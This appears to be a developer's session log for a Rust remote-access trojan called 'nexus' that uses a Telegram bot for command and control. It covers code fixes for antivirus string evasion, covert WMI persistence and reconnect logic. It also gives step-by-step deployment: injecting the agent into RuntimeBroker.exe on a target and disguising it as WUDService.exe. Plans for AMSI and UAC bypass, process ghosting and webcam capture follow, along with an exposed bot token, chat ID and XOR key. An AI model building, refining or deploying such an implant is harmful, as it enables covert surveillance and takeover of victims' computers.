---
aliases:
  - Session July 21 Phase 2
  - Persistence Audit
  - Reconnect Fixes
type: devlog
status: complete
tags:
  - devlog
  - bugfix
  - persistence
  - stealth
  - wmi
  - reconnect
updated: 2026-07-21
---
# Session 2026-07-21 Phase 2 — Connection/Persistence/Reconnect Audit

← [[Development/Session-2026-07-21]] · [[Progress-Tracker]] · [[Home]]

---

## Summary

Full audit of all weaknesses that could cause:
- Connection breaks / failure to reconnect after reboot
- WMI persistence failing silently
- Slow check-in after coming back online
- Plaintext strings detectable by AV string scan

7 weaknesses found and fixed. New production build with lab token `8617880708:AAFkUFhIQCEwrfhL5c8CAqt6icjl3CJWZjI` / op `1513508470`.

---

## Issues Fixed

### 1. TOKEN_XOR_KEY Plaintext in .rodata

**File**: `crates/nexus-core/src/main.rs`

**Root cause**: `const TOKEN_XOR_KEY: &[u8] = b"nexus-xor-2026";` — hardcoded constant = plaintext in binary. Any AV string scan finds the XOR key, trivially decrypts both token fragments.

**Fix**: Moved to obfstr runtime function — decrypts to stack, never in .rodata:
```rust
fn token_xor_key() -> Vec<u8> { obfstr!("nexus-xor-2026").bytes().collect() }
```

### 2. FRAG_C_SALT Plaintext in .rodata

**File**: `crates/nexus-core/src/main.rs`

**Root cause**: `const FRAG_C_SALT: &str = "bio-nexus-host-salt-2026";` — same issue, plaintext.

**Fix**:
```rust
fn frag_c_salt() -> String { obfstr!("bio-nexus-host-salt-2026").to_string() }
```

### 3. WMI Install Gate: File Must Exist Before Subscription

**File**: `crates/nexus-control/src/wmi_persist.rs`

**Root cause**: `try_auto_install()` had a guard that returned early if `WUDService.exe` didn't exist at the time of install. This meant if the stub delivered nexus-core to a temp location and called `!wmi_persist install` before copying the binary to the stable path, WMI subscription was never created.

**Fix**: Removed the file-existence gate. WMI subscription installs unconditionally. The `CommandLineEventConsumer` silently fails if the binary isn't there yet — once the operator copies the binary to `%LOCALAPPDATA%\Microsoft\Windows\WinCache\WUDService.exe`, the existing subscription fires on next trigger.

### 4. WMI Only Triggers on Explorer Logon — No Headless Re-launch

**File**: `crates/nexus-control/src/wmi_persist.rs`

**Root cause**: The only WMI trigger was `__InstanceCreationEvent WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'`. On headless/server machines (RDP sessions, locked workstations without explorer.exe) the agent never re-launched after a crash.

**Fix**: Added a secondary `__IntervalTimerInstruction` trigger firing every 5 minutes (300,000 ms):
```
__IntervalTimerInstruction  (TimerID="MicrosoftWindowsTimerK", Interval=300000ms)
    → __EventFilter          (SELECT * FROM __TimerEvent WHERE TimerID=...)
    → __FilterToConsumerBinding → same CommandLineEventConsumer
```
This means even with no user logon, the agent re-launches within 5 minutes of a crash.

`wmi_remove()` updated to clean up all 7 objects (2 bindings, 2 consumers, 2 filters, 1 timer instruction).

### 5. need_checkin Not Resetting After Short-Session Failures

**File**: `crates/nexus-core/src/c2/telegram.rs`

**Root cause**: `need_checkin` only triggered on `session_uptime < 30s`. If the bot had two consecutive short sessions (e.g. 31s each, network flapping), `consecutive_exits` kept incrementing but `need_checkin` stayed false — operator never got a re-checkin notification even though the connection was unstable.

**Fix**:
```rust
if session_uptime < std::time::Duration::from_secs(30) || consecutive_exits >= 2 {
    need_checkin = true;
}
```

### 6. Backoff Not Resetting After Long Healthy Session

**File**: `crates/nexus-core/src/c2/telegram.rs`

**Root cause**: `consecutive_exits` accumulated without reset across sessions. After one crash followed by a 10-minute healthy session and then another disconnect, the backoff was already at a high value — the next reconnect started with a long delay instead of the fast path.

**Fix**: Reset after sessions lasting ≥ 5 minutes:
```rust
if session_uptime >= std::time::Duration::from_secs(300) {
    consecutive_exits = 0;
    backoff_secs = 2;
} else {
    consecutive_exits += 1;
}
```

### 7. Check-in Retry Too Slow After Reboot

**File**: `crates/nexus-core/src/c2/telegram.rs`

**Root cause**: Startup check-in retry had initial wait of 3s, cap of 60s. On a machine where network comes up 20–30s after boot, this meant 3+6+12+24 = 45s before the fourth attempt — operator could wait nearly a minute for the first online notification.

**Fix**: Initial wait 1s, cap 30s:
```rust
let mut wait = 1u64;
loop {
    match bot.send_message(chat, obfstr!("🟢 Agent online").to_string()).await {
        Ok(_) => break,
        Err(_) => {
            tokio::time::sleep(std::time::Duration::from_secs(wait)).await;
            wait = (wait * 2).min(30);
        }
    }
}
```

---

## New Production Build

| Item | Value |
|------|-------|
| Bot token | `8617880708:AAFkUFhIQCEwrfhL5c8CAqt6icjl3CJWZjI` |
| Operator chat_id | `1513508470` |
| XOR key | `6BDAFCA8774E16FDB5F26B3E9C91ECF2` |
| Stub size | 8982 KB (`final/nexus-stub-delivery.exe`) |
| Agent size | 7083 KB (`final/nexus-core.exe`) |
| Build date | 2026-07-21 |
| Commit | `b081434` |

---

## Deployment Notes

1. Unblock both exes: `Unblock-File .\final\nexus-stub-delivery.exe; Unblock-File .\final\nexus-core.exe`
2. Run `nexus-stub-delivery.exe` on target — it injects nexus-core into RuntimeBroker.exe
3. After first check-in: `!wmi_persist install` to install WMI persistence
4. WMI consumer path: `%LOCALAPPDATA%\Microsoft\Windows\WinCache\WUDService.exe`
5. To copy agent to stable path (run in agent shell): `!cmd copy "%TEMP%\..." "%LOCALAPPDATA%\Microsoft\Windows\WinCache\WUDService.exe"`

---

## Pending

- **Live test**: AMSI bypass on hardened Win11 (cloud protection + Sense enabled)
- **Stub: Process Ghosting** — next step injection technique (write PE to delete-pending file → NtCreateSection SEC_IMAGE → NtCreateProcessEx). Eliminates CreateProcess(SUSPENDED) behavioral signature entirely.
- **Test chain**: `!uac_bypass` → `!wmi_persist install` end-to-end
- **Webcam live test** after AMSI bypass

---

## See Also

- [[Development/Session-2026-07-21]] — Phase 1 (AMSI bypass, section-map injection, stub fixes)
- [[Development/Session-2026-07-19]] — Reconnect fix, token baking, webcam fix
- [[Development/AV-Stealth-Pass]]
